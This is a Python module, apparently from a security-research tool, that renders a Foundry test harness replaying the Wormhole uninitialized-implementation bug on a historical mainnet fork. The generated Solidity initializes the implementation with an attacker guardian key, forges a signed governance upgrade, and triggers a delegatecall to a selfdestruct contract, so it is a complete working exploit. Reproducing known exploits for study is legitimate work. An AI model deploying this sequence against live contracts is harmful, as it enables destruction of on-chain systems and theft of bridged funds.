"""Wormhole historical implementation-initializer replay harness.

The Wormhole SC01 case is special: current Explorer source points at the
patched implementation, while the reproducible bug lives at a historical fork
block where the proxy's EIP-1967 implementation slot held the vulnerable
implementation. The harness is therefore interface-only and reads the
implementation address from forked proxy storage at runtime.
"""

from __future__ import annotations

from typing import Any

from vassago_contract_runtime.sc01_source import evaluate_wormhole_uninitialized_implementation


WORMHOLE_PROXY = "0x98f3c9e6E3fAce36bAAd05FE09d375Ef1464288B"
WORMHOLE_FORK_BLOCK = 13_818_843
WORMHOLE_IMPLEMENTATION_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
WORMHOLE_MALICIOUS_MARKER_SLOT = "0xcc422457c9e59a24a9cb236276c9b289524b6832b3bfe6c3e6b55b30515d59b0"


def should_use_wormhole_harness(source_manifest: dict[str, Any]) -> bool:
    evaluation = evaluate_wormhole_uninitialized_implementation(source_manifest)
    return bool(evaluation.get("verified")) and _is_wormhole_proxy_target(source_manifest)


def wormhole_fork(source_manifest: dict[str, Any]) -> dict[str, Any]:
    if should_use_wormhole_harness(source_manifest):
        return {"block_number": WORMHOLE_FORK_BLOCK, "requires_rpc_url": True}
    return {}


def wormhole_foundry_toml(source_manifest: dict[str, Any]) -> str | None:
    if not should_use_wormhole_harness(source_manifest):
        return None
    return "\n".join(
        [
            "[profile.default]",
            'src = "src"',
            'test = "test"',
            'out = "out"',
            'libs = ["lib"]',
            "auto_detect_solc = true",
            'evm_version = "london"',
            "",
        ]
    )


def render_wormhole_harness(source_manifest: dict[str, Any]) -> str:
    evaluation = evaluate_wormhole_uninitialized_implementation(source_manifest)
    proxy = _target_address(source_manifest) or WORMHOLE_PROXY
    if proxy.lower() == WORMHOLE_PROXY.lower():
        proxy = WORMHOLE_PROXY
    implementation_slot = WORMHOLE_IMPLEMENTATION_SLOT
    marker_slot = WORMHOLE_MALICIOUS_MARKER_SLOT
    predicate = str(evaluation.get("explicit_predicate") or "wormhole implementation replay")
    return "\n".join(
        [
            "// SPDX-License-Identifier: MIT",
            "pragma solidity ^0.8.24;",
            "",
            "interface Vm {",
            "    function addr(uint256 privateKey) external returns (address);",
            "    function load(address target, bytes32 slot) external view returns (bytes32);",
            "    function sign(uint256 privateKey, bytes32 digest) external returns (uint8 v, bytes32 r, bytes32 s);",
            "}",
            "",
            "interface IWormholeImplementation {",
            "    function initialize(address[] memory initialGuardians, uint16 chainId, uint16 governanceChainId, bytes32 governanceContract) external;",
            "    function submitContractUpgrade(bytes memory vm) external;",
            "    function chainId() external view returns (uint16);",
            "    function governanceChainId() external view returns (uint16);",
            "    function governanceContract() external view returns (bytes32);",
            "    function getCurrentGuardianSetIndex() external view returns (uint32);",
            "}",
            "",
            "contract MaliciousImplementation {",
            "    function initialize() external {",
            f"        bytes32 markerSlot = {marker_slot};",
            "        address markerValue = msg.sender;",
            "        assembly { sstore(markerSlot, markerValue) }",
            "        Destructor destructor = new Destructor();",
            "        (bool ok, ) = address(destructor).delegatecall(abi.encodeWithSignature(\"destruct()\"));",
            "        require(ok, \"malicious delegatecall failed\");",
            "    }",
            "}",
            "",
            "contract Destructor {",
            "    function destruct() external {",
            "        selfdestruct(payable(msg.sender));",
            "    }",
            "}",
            "",
            "contract VassagoSC01Harness {",
            "    Vm constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));",
            f"    address constant WORMHOLE_PROXY = {proxy};",
            f"    bytes32 constant IMPLEMENTATION_SLOT = {implementation_slot};",
            f"    bytes32 constant MALICIOUS_MARKER_SLOT = {marker_slot};",
            "    bytes32 constant GOVERNANCE_MODULE = bytes32(uint256(0x436f7265));",
            "    uint8 constant ACTION_CONTRACT_UPGRADE = 1;",
            "    uint256 constant ATTACKER_GUARDIAN_KEY = uint256(0xA11CE);",
            "",
            "    function testWormholeImplementationInitializerReplayExecutesMaliciousDelegatecall() external {",
            "        address implementation = _implementationFromProxySlot();",
            "        require(implementation != address(0), \"implementation missing\");",
            "        require(implementation.code.length > 0, \"implementation code missing before replay\");",
            "",
            "        IWormholeImplementation target = IWormholeImplementation(implementation);",
            "        require(target.chainId() == 0, \"implementation already initialized\");",
            "",
            "        address attackerGuardian = vm.addr(ATTACKER_GUARDIAN_KEY);",
            "        address[] memory guardians = new address[](1);",
            "        guardians[0] = attackerGuardian;",
            "        target.initialize(guardians, 0, 0, bytes32(0));",
            "",
            "        MaliciousImplementation malicious = new MaliciousImplementation();",
            "        bytes memory payload = _contractUpgradePayload(address(malicious));",
            "        bytes memory signedVm = _signGovernanceVM(target, payload);",
            "        bytes32 beforeMarker = vm.load(implementation, MALICIOUS_MARKER_SLOT);",
            "        target.submitContractUpgrade(signedVm);",
            "",
            "        bytes32 afterMarker = vm.load(implementation, MALICIOUS_MARKER_SLOT);",
            "        require(beforeMarker != afterMarker, \"malicious initializer marker unchanged\");",
            "        require(",
            "            address(uint160(uint256(afterMarker))) == address(this),",
            "            \"malicious initializer marker wrong actor\"",
            "        );",
            "    }",
            "",
            "    function _implementationFromProxySlot() internal view returns (address implementation) {",
            "        bytes32 raw = vm.load(WORMHOLE_PROXY, IMPLEMENTATION_SLOT);",
            "        implementation = address(uint160(uint256(raw)));",
            "    }",
            "",
            "    function _contractUpgradePayload(address newImplementation) internal pure returns (bytes memory) {",
            "        return abi.encodePacked(",
            "            GOVERNANCE_MODULE,",
            "            ACTION_CONTRACT_UPGRADE,",
            "            uint16(0),",
            "            bytes32(uint256(uint160(newImplementation)))",
            "        );",
            "    }",
            "",
            "    function _signGovernanceVM(",
            "        IWormholeImplementation target,",
            "        bytes memory payload",
            "    ) internal returns (bytes memory) {",
            "        bytes memory body = abi.encodePacked(",
            "            uint32(0),",
            "            uint32(0),",
            "            target.governanceChainId(),",
            "            target.governanceContract(),",
            "            uint64(0),",
            "            uint8(2),",
            "            payload",
            "        );",
            "        bytes32 digest = keccak256(abi.encodePacked(keccak256(body)));",
            "        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ATTACKER_GUARDIAN_KEY, digest);",
            "        if (v >= 27) {",
            "            v -= 27;",
            "        }",
            "        return abi.encodePacked(",
            "            uint8(1),",
            "            target.getCurrentGuardianSetIndex(),",
            "            uint8(1),",
            "            uint8(0),",
            "            r,",
            "            s,",
            "            v,",
            "            body",
            "        );",
            "    }",
            "",
            f"    function __vassagoPredicate() external pure returns (string memory) {{ return \"{_escape_solidity_string(predicate)}\"; }}",
            "}",
            "",
        ]
    )


def _is_wormhole_proxy_target(source_manifest: dict[str, Any]) -> bool:
    return _target_address(source_manifest).lower() == WORMHOLE_PROXY.lower()


def _target_address(source_manifest: dict[str, Any]) -> str:
    target = dict(source_manifest.get("target") or {})
    return str(target.get("address") or "")


def _escape_solidity_string(value: str) -> str:
    return value.replace("\\", "\\\\").replace('"', '\\"')
